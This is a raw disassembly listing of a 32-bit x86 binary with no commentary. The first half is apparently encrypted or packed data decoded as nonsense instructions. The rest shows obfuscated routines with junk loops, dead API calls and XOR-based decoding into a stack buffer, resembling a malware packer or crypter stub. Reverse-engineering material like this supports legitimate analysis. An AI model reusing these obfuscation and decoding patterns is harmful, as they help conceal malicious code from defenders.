  40f357:	js     0x40f2df
  40f359:	jge    0x40f3af
  40f35b:	mov    ebp,0x3b78e87f
  40f360:	lods   eax,DWORD PTR ds:[esi]
  40f361:	xchg   DWORD PTR [edi+esi*1],ebx
  40f364:	and    ebx,DWORD PTR [eax-0x14]
  40f367:	std    
  40f368:	or     al,0xc9
  40f36a:	jmp    0x680516ef
  40f36f:	aam    0x48
  40f371:	push   eax
  40f372:	(bad)  
  40f373:	push   cs
  40f374:	jl     0x40f3c7
  40f376:	repz test BYTE PTR ds:0xfab6e6ae,bl
  40f37d:	addr16 inc esi
  40f37f:	jl     0x40f34f
  40f381:	out    0x44,eax
  40f383:	mov    dl,0x75
  40f385:	sub    eax,0x634e20d1
  40f38a:	mov    ds:0x6f7d1263,al
  40f38f:	or     dh,dl
  40f391:	sbb    BYTE PTR [ebp-0x7a],cl
  40f394:	mov    ?,WORD PTR [ebx+0x7d]
  40f397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f398:	pop    edx
  40f399:	test   eax,0xdc452f68
  40f39e:	or     al,0x56
  40f3a0:	push   0x15
  40f3a2:	in     eax,dx
  40f3a3:	fs mov ecx,0x6a6e2e42
  40f3a9:	push   edi
  40f3aa:	shl    BYTE PTR [esi+0x46],0xe7
  40f3ae:	xlat   BYTE PTR ds:[ebx]
  40f3af:	or     esp,DWORD PTR [ebx-0x24]
  40f3b2:	sbb    bl,bl
  40f3b4:	dec    eax
  40f3b5:	pop    ecx
  40f3b6:	xchg   ecx,eax
  40f3b7:	sti    
  40f3b8:	lods   eax,DWORD PTR ds:[esi]
  40f3b9:	add    al,0x37
  40f3bb:	and    ebp,DWORD PTR [ebp-0x39cb9728]
  40f3c1:	es fdiv st(4),st
  40f3c4:	rol    BYTE PTR [eax-0x14],1
  40f3c7:	int    0x73
  40f3c9:	mov    cl,0x45
  40f3cb:	icebp  
  40f3cc:	or     ch,dh
  40f3ce:	sti    
  40f3cf:	mov    ebx,0xd66fd5e4
  40f3d4:	ds (bad) 
  40f3d6:	mov    esp,0x4e0d0950
  40f3db:	cdq    
  40f3dc:	les    edi,FWORD PTR [ecx+0x3f]
  40f3df:	cmp    BYTE PTR [ebx],dh
  40f3e1:	mov    eax,0x582d8282
  40f3e6:	pushf  
  40f3e7:	push   eax
  40f3e8:	or     esp,DWORD PTR [eax-0x525c83ed]
  40f3ee:	sbb    eax,ecx
  40f3f0:	inc    eax
  40f3f1:	cmp    al,0x8a
  40f3f3:	bnd jmp 0x40f3bb
  40f3f6:	push   ds
  40f3f7:	fs add eax,0x7e1e6c75
  40f3fd:	dec    BYTE PTR [eax-0x7e2d28c0]
  40f403:	(bad)  
  40f404:	hlt    
  40f405:	dec    edi
  40f406:	test   eax,0x42ef40ec
  40f40b:	sbb    DWORD PTR ds:0x1beb5f55,esi
  40f411:	int3   
  40f412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f413:	xor    al,0xd5
  40f415:	jmp    0x40f473
  40f417:	sbb    BYTE PTR [edi-0x5],dl
  40f41a:	inc    eax
  40f41b:	push   es
  40f41c:	pop    ebp
  40f41d:	and    BYTE PTR [eax-0x7],bh
  40f420:	cdq    
  40f421:	sbb    eax,0xf71381f8
  40f426:	call   0x9d490606
  40f42b:	das    
  40f42c:	sbb    edi,DWORD PTR [edx+0x62f881e9]
  40f432:	pop    ds
  40f433:	pop    eax
  40f434:	jp     0x40f3ec
  40f436:	mov    esi,0x57098057
  40f43b:	cmc    
  40f43c:	mov    ds:0xc2cd3239,al
  40f441:	push   ss
  40f442:	push   esp
  40f443:	(bad)  
  40f444:	and    al,0xf1
  40f446:	fisttp WORD PTR [ebx-0x6b]
  40f449:	aas    
  40f44a:	jmp    0x931d:0xc803d25f
  40f451:	lods   eax,DWORD PTR ds:[esi]
  40f452:	mov    ds:0xbf4be182,al
  40f457:	pusha  
  40f458:	ret    0xd811
  40f45b:	push   ebp
  40f45c:	gs out 0xbb,eax
  40f45f:	xchg   esi,eax
  40f460:	test   BYTE PTR [esi],cl
  40f462:	xor    BYTE PTR [ebx-0x3f],ah
  40f465:	ror    dl,0xc6
  40f468:	push   edi
  40f469:	push   esi
  40f46a:	ret    0x8731
  40f46d:	xor    eax,0xdd51b9b4
  40f472:	aas    
  40f473:	imul   ebx,DWORD PTR [ecx],0xffffffe2
  40f476:	std    
  40f477:	div    BYTE PTR [edi]
  40f479:	mov    edi,0xc9ce9038
  40f47e:	in     eax,dx
  40f47f:	xchg   edx,eax
  40f480:	das    
  40f481:	push   cs
  40f482:	clc    
  40f483:	outs   dx,DWORD PTR ds:[esi]
  40f484:	out    0xd2,eax
  40f486:	fdiv   DWORD PTR [edx]
  40f488:	fisub  WORD PTR [eax-0x20]
  40f48b:	outs   dx,BYTE PTR ds:[esi]
  40f48c:	mov    edi,0x8b5f5743
  40f491:	ins    DWORD PTR es:[edi],dx
  40f492:	sbb    DWORD PTR [edx-0x60],ebx
  40f495:	aam    0x97
  40f497:	push   ebx
  40f498:	test   BYTE PTR [edx+edi*8],0x9d
  40f49c:	xchg   ecx,eax
  40f49d:	sahf   
  40f49e:	out    0x59,eax
  40f4a0:	pop    ecx
  40f4a1:	dec    esi
  40f4a2:	and    DWORD PTR [ebx-0x593b3552],esi
  40f4a8:	jne    0x40f476
  40f4aa:	jp     0x40f447
  40f4ac:	lds    ecx,FWORD PTR [ecx-0x7638c6d1]
  40f4b2:	jae    0x40f47d
  40f4b4:	loop   0x40f4e2
  40f4b6:	mov    ah,0x81
  40f4b8:	or     dl,ah
  40f4ba:	ror    BYTE PTR [edx+0x3c1488a8],0xb6
  40f4c1:	pop    ss
  40f4c2:	cmc    
  40f4c3:	pop    esi
  40f4c4:	mov    esi,0x50ac327c
  40f4c9:	cmp    edx,0x7a395126
  40f4cf:	cmp    edi,esp
  40f4d1:	retf   0x60e9
  40f4d4:	sahf   
  40f4d5:	adc    ch,BYTE PTR [ebx+0x71]
  40f4d8:	push   edx
  40f4d9:	fcmovnbe st,st(0)
  40f4db:	fs jmp 0x40f530
  40f4de:	cli    
  40f4df:	outs   dx,BYTE PTR ds:[esi]
  40f4e0:	push   es
  40f4e1:	cs js  0x40f4f8
  40f4e4:	scas   eax,DWORD PTR es:[edi]
  40f4e5:	retf   
  40f4e6:	imul   esi,DWORD PTR [edi-0x1c],0x28
  40f4ea:	dec    ecx
  40f4eb:	mov    dl,0x43
  40f4ed:	sub    DWORD PTR fs:[esi+ecx*1+0x7ead62c8],ebx
  40f4f5:	mov    DWORD PTR [ecx],0xcca22869
  40f4fb:	mov    esi,0xe08004fa
  40f500:	std    
  40f501:	jp     0x40f4ab
  40f503:	push   edi
  40f504:	aam    0x3d
  40f506:	cdq    
  40f507:	cli    
  40f508:	shl    edi,0xc8
  40f50b:	test   eax,0xea3e36bb
  40f510:	shl    BYTE PTR [ebp-0x2c],0xd5
  40f514:	fs mov ecx,0x76e40ee4
  40f51a:	fwait
  40f51b:	imul   edi,DWORD PTR [ebp-0x46b44c13],0x60
  40f522:	outs   dx,BYTE PTR cs:[esi]
  40f524:	rcl    edi,1
  40f526:	(bad)  
  40f527:	stc    
  40f528:	push   edi
  40f529:	and    eax,0x7cab3fed
  40f52e:	(bad)  
  40f52f:	mov    bl,0x40
  40f531:	daa    
  40f532:	stos   DWORD PTR es:[edi],eax
  40f533:	int    0x4c
  40f535:	in     al,dx
  40f536:	mov    dh,0xa3
  40f538:	pop    ecx
  40f539:	adc    esp,ebx
  40f53b:	cmp    DWORD PTR [bp+di+0x2a],ecx
  40f53f:	ret    
  40f540:	stc    
  40f541:	push   esi
  40f542:	sub    BYTE PTR [eax],0x76
  40f545:	dec    edi
  40f546:	data16 jecxz 0x40f543
  40f549:	push   cs
  40f54a:	xchg   ecx,eax
  40f54c:	out    0xe4,al
  40f54e:	xchg   edx,eax
  40f54f:	test   al,0x92
  40f551:	std    
  40f552:	jae    0x40f4f4
  40f554:	mov    cl,0xcb
  40f556:	(bad)  
  40f557:	mov    es,WORD PTR [ebp+edx*2-0x5bb635b]
  40f55e:	push   eax
  40f55f:	aas    
  40f560:	jmp    FWORD PTR [edi-0x34]
  40f563:	cmp    al,0x83
  40f565:	jg     0x40f5e2
  40f567:	clc    
  40f568:	and    al,0xa0
  40f56a:	mov    dh,BYTE PTR [ecx-0x5a420ef7]
  40f570:	jge    0x40f581
  40f572:	adc    BYTE PTR [edx-0x71],dh
  40f575:	push   ebx
  40f576:	fsub   st(3),st
  40f578:	xchg   ebx,eax
  40f579:	shr    BYTE PTR [eax+0xa5f5dc4],cl
  40f57f:	jae    0x40f5f7
  40f581:	or     al,0x5
  40f583:	das    
  40f584:	fxch   st(4)
  40f586:	xchg   edx,edx
  40f588:	adc    bl,al
  40f58a:	(bad)  
  40f58b:	lods   eax,DWORD PTR ds:[esi]
  40f58c:	sbb    al,0xdc
  40f58e:	es popa 
  40f590:	sbb    DWORD PTR [ebp+0x7b],eax
  40f593:	and    dh,BYTE PTR [ecx]
  40f595:	sar    DWORD PTR [esi-0xd202a22],1
  40f59b:	push   ebx
  40f59c:	push   edx
  40f59d:	fcomp  QWORD PTR es:[esi+0x79962915]
  40f5a4:	fadd   QWORD PTR [ebx+0x68]
  40f5a7:	and    edx,eax
  40f5a9:	pop    eax
  40f5aa:	rol    DWORD PTR [ebp-0x65],cl
  40f5ad:	xor    edx,DWORD PTR [edx+edi*4+0x7e]
  40f5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5b2:	add    dl,dh
  40f5b4:	jbe    0x40f5b4
  40f5b6:	sub    ch,0xca
  40f5b9:	jbe    0x40f5f6
  40f5bb:	mov    ebp,0xff075e5d
  40f5c0:	sub    dh,BYTE PTR [ecx]
  40f5c2:	xchg   ebx,eax
  40f5c3:	xor    DWORD PTR ds:0xe35797c3,0xa104662e
  40f5cd:	push   edi
  40f5ce:	push   cs
  40f5cf:	dec    BYTE PTR [eax]
  40f5d1:	or     eax,0xf028f05b
  40f5d6:	add    bl,BYTE PTR [eax+0x5e]
  40f5d9:	mov    bl,0xf0
  40f5db:	push   0xffffffd1
  40f5dd:	sti    
  40f5de:	jg     0x40f5d3
  40f5e0:	(bad)  
  40f5e1:	stc    
  40f5e2:	js     0x40f58f
  40f5e4:	retf   0x4021
  40f5e7:	mov    DWORD PTR [eax],ebx
  40f5e9:	iret   
  40f5ea:	nop
  40f5eb:	sbb    eax,0xa4272cd5
  40f5f0:	(bad)  
  40f5f1:	and    al,0x66
  40f5f3:	pop    eax
  40f5f4:	and    al,cl
  40f5f6:	dec    edx
  40f5f7:	es sbb eax,0x718eb80c
  40f5fd:	xor    eax,0xbd52a9b5
  40f602:	mov    ebx,0x2be1f9c1
  40f607:	jl     0x40f5c1
  40f609:	inc    eax
  40f60a:	arpl   WORD PTR [esi+0x76e145c4],sp
  40f610:	mov    bh,dl
  40f612:	(bad)  
  40f613:	out    dx,al
  40f614:	xchg   esi,eax
  40f615:	xor    BYTE PTR [edi+0x47],bh
  40f618:	add    eax,0xd47b7184
  40f61d:	popf   
  40f61e:	sahf   
  40f61f:	sub    ah,dl
  40f621:	data16 fisubr WORD PTR [edx]
  40f624:	xchg   esp,eax
  40f625:	mov    dl,0x55
  40f627:	popa   
  40f628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f629:	push   0xbb51c635
  40f62e:	jae    0x40f5fc
  40f630:	sub    al,0xe2
  40f632:	ret    
  40f633:	fdiv   QWORD PTR [esi*2-0x5b7f7df1]
  40f63a:	adc    edi,0xce86ebcc
  40f640:	mov    ebp,0x481276be
  40f645:	in     al,0x76
  40f647:	jmp    0x40f6ac
  40f649:	neg    edx
  40f64b:	jle    0x40f65b
  40f64d:	test   DWORD PTR [esi-0x4f],eax
  40f650:	xor    esi,DWORD PTR [ecx]
  40f652:	pop    edi
  40f653:	add    DWORD PTR [eax+0x6fea8584],ebx
  40f659:	(bad)  [ebp+ebx*4+0x6920deeb]
  40f660:	lods   eax,DWORD PTR ds:[esi]
  40f661:	mov    eax,ds:0x232ee5c
  40f666:	dec    ebx
  40f667:	sub    ecx,esp
  40f669:	out    0x40,eax
  40f66b:	jle    0x40f6a1
  40f66d:	xchg   ebx,eax
  40f66e:	popa   
  40f66f:	pop    eax
  40f670:	scas   al,BYTE PTR es:[edi]
  40f671:	and    edi,ebx
  40f673:	xchg   ebp,eax
  40f674:	add    dl,BYTE PTR [ecx+edx*2-0x68]
  40f678:	xor    al,0xe0
  40f67a:	sbb    BYTE PTR [ecx-0x59a71eb6],ah
  40f680:	push   esi
  40f681:	(bad)  
  40f683:	dec    ebp
  40f684:	dec    ebp
  40f685:	mov    al,ds:0xa103f9ec
  40f68a:	call   0xf3f2:0x95d28b5
  40f691:	adc    BYTE PTR [edx],0x6a
  40f694:	xchg   ecx,eax
  40f695:	pop    ebp
  40f696:	repnz shl BYTE PTR [ebp+ebx*2+0x454f8fc7],0x4e
  40f69f:	ret    
  40f6a0:	rol    al,cl
  40f6a2:	mov    ebx,0x324affe0
  40f6a7:	pop    ds
  40f6a8:	mov    dh,0x79
  40f6aa:	push   edx
  40f6ab:	gs xchg esp,eax
  40f6ad:	icebp  
  40f6ae:	dec    edx
  40f6af:	mov    cl,0xcf
  40f6b1:	pushf  
  40f6b2:	call   0xd4f7ea7f
  40f6b7:	adc    eax,0xa5406d3c
  40f6bc:	inc    eax
  40f6bd:	jmp    0x5ce312a2
  40f6c2:	std    
  40f6c3:	(bad)  
  40f6c4:	retf   0xf2fb
  40f6c7:	cs dec edx
  40f6c9:	adc    BYTE PTR [esi+0x3],bh
  40f6cc:	and    BYTE PTR [edx+0x4f589e9d],dl
  40f6d2:	or     cl,ah
  40f6d4:	pop    edi
  40f6d5:	xchg   ebp,eax
  40f6d6:	icebp  
  40f6d7:	cmp    ah,bh
  40f6d9:	push   ds
  40f6da:	(bad)  
  40f6db:	(bad)  
  40f6dc:	xchg   edi,eax
  40f6dd:	ins    BYTE PTR es:[edi],dx
  40f6de:	mov    eax,0xd6afe00f
  40f6e3:	fcom   st(1)
  40f6e5:	mov    cl,0x9c
  40f6e7:	mov    edx,0xd5447c9b
  40f6ec:	and    bl,BYTE PTR [edx-0x3e0ad25a]
  40f6f2:	cmp    al,0x1c
  40f6f4:	fwait
  40f6f5:	into   
  40f6f6:	ffree  st(0)
  40f6f8:	test   cl,dh
  40f6fa:	ss fcomp DWORD PTR ss:[eax]
  40f6fe:	jnp    0x40f695
  40f700:	sti    
  40f701:	(bad)  
  40f702:	adc    eax,0xb2e0f135
  40f707:	gs xor eax,0xd4903c9f
  40f70d:	adc    eax,0x16fd9a2e
  40f712:	cmp    BYTE PTR [ebx+0x36],cl
  40f715:	pop    ebx
  40f716:	aad    0xe9
  40f718:	sti    
  40f719:	xor    ah,BYTE PTR [ecx+0x203d1bf9]
  40f71f:	aas    
  40f720:	icebp  
  40f721:	or     BYTE PTR [edx-0x308d1046],ch
  40f727:	dec    esi
  40f728:	(bad)  
  40f72a:	fisub  WORD PTR [eax+0x48]
  40f72d:	push   eax
  40f72e:	xchg   ebp,eax
  40f72f:	pop    esp
  40f730:	pop    ecx
  40f731:	mov    ebp,0x5b89f16b
  40f736:	sti    
  40f737:	inc    ecx
  40f738:	test   BYTE PTR [edx],ah
  40f73a:	push   0x14d2c982
  40f73f:	cmp    al,dl
  40f741:	push   es
  40f742:	repnz sub eax,esp
  40f745:	fst    DWORD PTR [ecx+eax*1]
  40f748:	out    dx,eax
  40f749:	push   ss
  40f74a:	sub    ebx,DWORD PTR [edi]
  40f74c:	and    eax,0x662048f9
  40f751:	add    esp,eax
  40f753:	xchg   edx,eax
  40f754:	push   eax
  40f755:	xor    ebx,ebx
  40f757:	mov    edx,esp
  40f759:	dec    edx
  40f75a:	inc    ebx
  40f75b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f75e:	dec    ebx
  40f75f:	xor    edx,edx
  40f761:	add    DWORD PTR [ebp-0x10],ebx
  40f764:	pop    ebx
  40f765:	mov    eax,DWORD PTR [ebp-0x10]
  40f768:	pop    edi
  40f769:	pop    esi
  40f76a:	pop    ebx
  40f76b:	leave  
  40f76c:	ret    0x10
  40f76f:	push   ebp
  40f770:	mov    ebp,esp
  40f772:	push   ecx
  40f773:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40f77a:	mov    ecx,DWORD PTR ds:0x42b26e
  40f780:	mov    edx,DWORD PTR ds:0x42b2da
  40f786:	sub    edx,ecx
  40f788:	xor    ecx,DWORD PTR [ecx+edx*1]
  40f78b:	mov    eax,DWORD PTR [ebp-0x4]
  40f78e:	and    DWORD PTR ds:0x42b226,0x0
  40f798:	mov    edx,DWORD PTR ds:0x42b226
  40f79e:	inc    edx
  40f79f:	mov    DWORD PTR ds:0x42b226,edx
  40f7a5:	cmp    DWORD PTR ds:0x42b226,0xb
  40f7ac:	jb     0x40f7f2
  40f7b2:	jmp    0x40f7cb
  40f7b7:	push   DWORD PTR [ebp-0x24]
  40f7ba:	push   DWORD PTR [ebp-0x24]
  40f7bd:	push   0x42a23f
  40f7c2:	push   DWORD PTR [ebp-0x1c]
  40f7c5:	call   DWORD PTR ds:0x42b306
  40f7cb:	cmp    DWORD PTR ds:0x42b226,0xa
  40f7d2:	jne    0x40f7e5
  40f7d8:	mov    edx,DWORD PTR ds:0x42b226
  40f7de:	inc    edx
  40f7df:	mov    DWORD PTR ds:0x42b226,edx
  40f7e5:	cmp    DWORD PTR ds:0x42b226,0x17
  40f7ec:	jb     0x40f798
  40f7f2:	mov    edx,DWORD PTR [ebp+0x10]
  40f7f5:	mov    ecx,0x75108ae
  40f7fa:	add    DWORD PTR ds:0x42b1ea,0x1734
  40f804:	xor    eax,ecx
  40f806:	add    eax,0x3272f5
  40f80b:	mov    DWORD PTR [edx],eax
  40f80d:	mov    eax,DWORD PTR [ebp+0xc]
  40f810:	xor    eax,ecx
  40f812:	push   esi
  40f813:	mov    esi,DWORD PTR [ebp+0x10]
  40f816:	mov    edx,0x3272f5
  40f81b:	add    eax,edx
  40f81d:	mov    DWORD PTR [esi+0x4],eax
  40f820:	mov    eax,DWORD PTR [ebp+0x14]
  40f823:	mov    esi,DWORD PTR [ebp+0x10]
  40f826:	mov    DWORD PTR [esi+0x8],eax
  40f829:	mov    eax,DWORD PTR [ebp+0x18]
  40f82c:	mov    esi,DWORD PTR [ebp+0x10]
  40f82f:	mov    DWORD PTR [esi+0xc],eax
  40f832:	mov    eax,DWORD PTR [ebp+0x1c]
  40f835:	mov    esi,DWORD PTR [ebp+0x10]
  40f838:	mov    DWORD PTR [esi+0x10],eax
  40f83b:	mov    eax,DWORD PTR [ebp+0x8]
  40f83e:	xor    eax,ecx
  40f840:	add    eax,edx
  40f842:	pop    esi
  40f843:	leave  
  40f844:	ret    0x18
  40f847:	push   ebp
  40f848:	mov    ebp,esp
  40f84a:	sub    esp,0x9c
  40f850:	and    DWORD PTR ds:0x42b1b6,0x0
  40f85a:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f860:	inc    ecx
  40f861:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f867:	cmp    DWORD PTR ds:0x42b1b6,0xd
  40f86e:	ja     0x40f8b2
  40f874:	jmp    0x40f88b
  40f879:	push   0x42a1d7
  40f87e:	push   0x0
  40f880:	push   0x7b23
  40f885:	call   DWORD PTR ds:0x42b30e
  40f88b:	cmp    DWORD PTR ds:0x42b1b6,0xc
  40f892:	jne    0x40f8a5
  40f898:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f89e:	inc    ecx
  40f89f:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f8a5:	cmp    DWORD PTR ds:0x42b1b6,0x14
  40f8ac:	jb     0x40f85a
  40f8b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8b5:	xor    eax,DWORD PTR ds:0x42b1a6
  40f8bb:	mov    eax,0x8a9a
  40f8c0:	xor    ax,WORD PTR [ecx+0x20]
  40f8c4:	xor    DWORD PTR ds:0x42b1d6,ebx
  40f8ca:	mov    ecx,0x3b5c
  40f8cf:	adc    DWORD PTR ds:0x42b206,0x42b22e
  40f8d9:	add    ax,cx
  40f8dc:	and    DWORD PTR ds:0x42b1ba,0x0
  40f8e6:	mov    ecx,DWORD PTR ds:0x42b1ba
  40f8ec:	inc    ecx
  40f8ed:	mov    DWORD PTR ds:0x42b1ba,ecx
  40f8f3:	cmp    DWORD PTR ds:0x42b1ba,0x1e
  40f8fa:	jge    0x40f91b
  40f900:	jmp    0x40f90e
  40f905:	push   DWORD PTR [ebp-0x20]
  40f908:	call   DWORD PTR ds:0x42b316
  40f90e:	cmp    DWORD PTR ds:0x42b1ba,0x19
  40f915:	jb     0x40f8e6
  40f91b:	movzx  eax,ax
  40f91e:	or     ecx,DWORD PTR ds:0x42b1fa
  40f924:	mov    DWORD PTR [ebp-0x10],eax
  40f927:	and    DWORD PTR ds:0x42b1a2,0x5305
  40f931:	mov    BYTE PTR [ebp-0x1],0x80
  40f935:	mov    ecx,DWORD PTR ds:0x42b22a
  40f93b:	sub    DWORD PTR ds:0x42b1f6,ecx
  40f941:	lea    eax,[ebp-0x1]
  40f944:	mov    DWORD PTR ds:0x42b21e,0x14
  40f94e:	cmp    DWORD PTR ds:0x42b21e,0x0
  40f955:	je     0x40f9a6
  40f95b:	cmp    DWORD PTR ds:0x42b21e,0x4
  40f962:	ja     0x40f9a6
  40f968:	jmp    0x40f97a
  40f96d:	push   0x5
  40f96f:	push   0x6029
  40f974:	call   DWORD PTR ds:0x42b31a
  40f97a:	cmp    DWORD PTR ds:0x42b21e,0x5
  40f981:	jne    0x40f994
  40f987:	mov    ecx,DWORD PTR ds:0x42b21e
  40f98d:	dec    ecx
  40f98e:	mov    DWORD PTR ds:0x42b21e,ecx
  40f994:	mov    ecx,DWORD PTR ds:0x42b21e
  40f99a:	dec    ecx
  40f99b:	mov    DWORD PTR ds:0x42b21e,ecx
  40f9a1:	jmp    0x40f94e
  40f9a6:	mov    DWORD PTR [ebp-0xc],eax
  40f9a9:	or     ecx,DWORD PTR ds:0x42b212
  40f9af:	mov    al,BYTE PTR [ebp-0x1]
  40f9b2:	xor    DWORD PTR ds:0x42b226,0x485
  40f9bc:	mov    ecx,DWORD PTR [ebp-0xc]
  40f9bf:	xor    al,0x7e
  40f9c1:	add    al,0x3
  40f9c3:	and    DWORD PTR ds:0x42b20a,0x20b6
  40f9cd:	mov    BYTE PTR [ecx],al
  40f9cf:	sbb    ecx,0x5f8e
  40f9d5:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  40f9dc:	push   ebx
  40f9dd:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  40f9e4:	and    DWORD PTR ds:0x42b1da,0x0
  40f9ee:	jmp    0x40f9fe
  40f9f3:	mov    eax,ds:0x42b1da
  40f9f8:	inc    eax
  40f9f9:	mov    ds:0x42b1da,eax
  40f9fe:	cmp    DWORD PTR ds:0x42b1da,0x14
  40fa05:	jae    0x40fa55
  40fa0b:	cmp    DWORD PTR ds:0x42b1da,0xb
  40fa12:	jbe    0x40fa55
  40fa18:	jmp    0x40fa35
  40fa1d:	push   0x42b1f2
  40fa22:	push   DWORD PTR [ebp-0xc]
  40fa25:	push   0x42a000
  40fa2a:	push   0x42a18d
  40fa2f:	call   DWORD PTR ds:0x42b31e
  40fa35:	cmp    DWORD PTR ds:0x42b1da,0xa
  40fa3c:	jne    0x40fa50
  40fa42:	xor    eax,eax
  40fa44:	xor    eax,DWORD PTR ds:0x42b1da
  40fa4a:	inc    eax
  40fa4b:	mov    ds:0x42b1da,eax
  40fa50:	jmp    0x40f9f3
  40fa55:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa58:	sub    DWORD PTR ds:0x42b1fa,0x685a
  40fa62:	push   esi
  40fa63:	dec    esi
  40fa64:	mov    eax,0x75108ae
  40fa69:	and    DWORD PTR ds:0x42b1b2,0x4a0b
  40fa73:	xor    ecx,eax
  40fa75:	or     DWORD PTR ds:0x42b212,ebx
  40fa7b:	mov    esi,0x3272f5
  40fa80:	adc    DWORD PTR ds:0x42b216,0x42b222
  40fa8a:	push   edi
  40fa8b:	and    DWORD PTR ds:0x42b19a,0x42b1a2
  40fa95:	add    ecx,esi
  40fa97:	mov    DWORD PTR ds:0x42b212,0x27f7
  40faa1:	jmp    0x40facf
  40faa6:	mov    DWORD PTR ds:0x42b1a2,0x4c70
  40fab0:	mov    dl,BYTE PTR [ebp-0x1]
  40fab3:	mov    DWORD PTR ds:0x42b1da,0x7ef5
  40fabd:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40fac4:	mov    DWORD PTR ds:0x42b21a,0x736d
  40face:	inc    ecx
  40facf:	mov    DWORD PTR ds:0x42b1b2,0x61ef
  40fad9:	cmp    ecx,0x40
  40fadc:	jb     0x40faa6
  40fae2:	sbb    edx,DWORD PTR ds:0x42b1de
  40fae8:	mov    edx,DWORD PTR [ebp-0x18]
  40faeb:	adc    DWORD PTR ds:0x42b18e,0x3f3e
  40faf5:	xor    edx,eax
  40faf7:	sub    DWORD PTR ds:0x42b1d2,0x42b1ce
  40fb01:	add    edx,esi
  40fb03:	jmp    0x40fbc0
  40fb08:	mov    edi,DWORD PTR [ebp+0x8]
  40fb0b:	mov    ecx,0x8a9a
  40fb10:	sbb    DWORD PTR ds:0x42b1e6,0x42b226
  40fb1a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40fb1f:	adc    DWORD PTR ds:0x42b1de,ecx
  40fb25:	mov    edi,0x3b5c
  40fb2a:	xor    DWORD PTR ds:0x42b1ca,0x42b1a2
  40fb34:	add    cx,di
  40fb37:	adc    DWORD PTR ds:0x42b1b6,0x7f83
  40fb41:	movzx  ecx,cx
  40fb44:	and    DWORD PTR ds:0x42b1f6,0x42b18a
  40fb4e:	mov    DWORD PTR [ebp-0xc],ecx
  40fb51:	and    DWORD PTR ds:0x42b21a,0x0
  40fb5b:	jmp    0x40fb6d
  40fb60:	mov    ecx,DWORD PTR ds:0x42b21a
  40fb66:	inc    ecx
  40fb67:	mov    DWORD PTR ds:0x42b21a,ecx
  40fb6d:	cmp    DWORD PTR ds:0x42b21a,0x19
  40fb74:	jae    0x40fb9c
  40fb7a:	cmp    DWORD PTR ds:0x42b21a,0x1e
  40fb81:	jge    0x40fb9c
  40fb87:	jmp    0x40fb97
  40fb8c:	push   0x1c76
  40fb91:	call   DWORD PTR ds:0x42b322
  40fb97:	jmp    0x40fb60
  40fb9c:	mov    ecx,DWORD PTR [ebp+0x8]
  40fb9f:	add    DWORD PTR ds:0x42b1d2,0x42b1ea
  40fba9:	movzx  ecx,WORD PTR [ecx+edx*4]
  40fbad:	xor    ecx,0x8a9a
  40fbb3:	add    ecx,edi
  40fbb5:	mov    edi,DWORD PTR [ebp-0xc]
  40fbb8:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fbbf:	inc    edx
  40fbc0:	mov    ecx,0xfa9
  40fbc5:	mov    ecx,DWORD PTR [ebp-0x10]
  40fbc8:	cmp    edx,ecx
  40fbca:	jne    0x40fb08
  40fbd0:	mov    DWORD PTR ds:0x42b186,0x1e
  40fbda:	cmp    DWORD PTR ds:0x42b186,0x0
  40fbe1:	je     0x40fc18
  40fbe7:	cmp    DWORD PTR ds:0x42b186,0x24
  40fbee:	jle    0x40fc18
  40fbf4:	jmp    0x40fc04
  40fbf9:	push   0x7864
  40fbfe:	call   DWORD PTR ds:0x42b326
  40fc04:	xor    ecx,ecx
  40fc06:	add    ecx,DWORD PTR ds:0x42b186
  40fc0c:	dec    ecx
  40fc0d:	mov    DWORD PTR ds:0x42b186,ecx
  40fc13:	jmp    0x40fbda
  40fc18:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc1b:	and    edi,edx
  40fc1d:	mov    edx,DWORD PTR [ebp+0x10]
  40fc20:	and    DWORD PTR ds:0x42b19a,0x0
  40fc2a:	mov    edi,DWORD PTR ds:0x42b19a
  40fc30:	inc    edi
  40fc31:	mov    DWORD PTR ds:0x42b19a,edi
  40fc37:	cmp    DWORD PTR ds:0x42b19a,0x25
  40fc3e:	jge    0x40fc76
  40fc44:	jmp    0x40fc69
  40fc49:	push   0x42a0fe
  40fc4e:	push   0x5d6f
  40fc53:	push   0x13cc
  40fc58:	push   DWORD PTR [ebp-0x1c]
  40fc5b:	push   0x3c54
  40fc60:	push   DWORD PTR [ebp-0x20]
  40fc63:	call   DWORD PTR ds:0x42b2ea
  40fc69:	cmp    DWORD PTR ds:0x42b19a,0x1d
  40fc70:	jb     0x40fc2a
  40fc76:	xor    ecx,eax
  40fc78:	inc    edi
  40fc79:	add    ecx,esi
  40fc7b:	and    DWORD PTR ds:0x42b1b6,0x0
  40fc85:	jmp    0x40fc97
  40fc8a:	mov    edi,DWORD PTR ds:0x42b1b6
  40fc90:	inc    edi
  40fc91:	mov    DWORD PTR ds:0x42b1b6,edi
  40fc97:	cmp    DWORD PTR ds:0x42b1b6,0x10
  40fc9e:	jae    0x40fcea
  40fca4:	cmp    DWORD PTR ds:0x42b1b6,0x6
  40fcab:	jl     0x40fcea
  40fcb1:	jmp    0x40fcc9
  40fcb6:	push   0x42a0fe
  40fcbb:	push   DWORD PTR [ebp-0x14]
  40fcbe:	push   0x1
  40fcc0:	push   DWORD PTR [ebp-0x1c]
  40fcc3:	call   DWORD PTR ds:0x42b2ee
  40fcc9:	cmp    DWORD PTR ds:0x42b1b6,0x5
  40fcd0:	jne    0x40fce5
  40fcd6:	xor    edi,edi
  40fcd8:	xor    edi,DWORD PTR ds:0x42b1b6
  40fcde:	inc    edi
  40fcdf:	mov    DWORD PTR ds:0x42b1b6,edi
  40fce5:	jmp    0x40fc8a
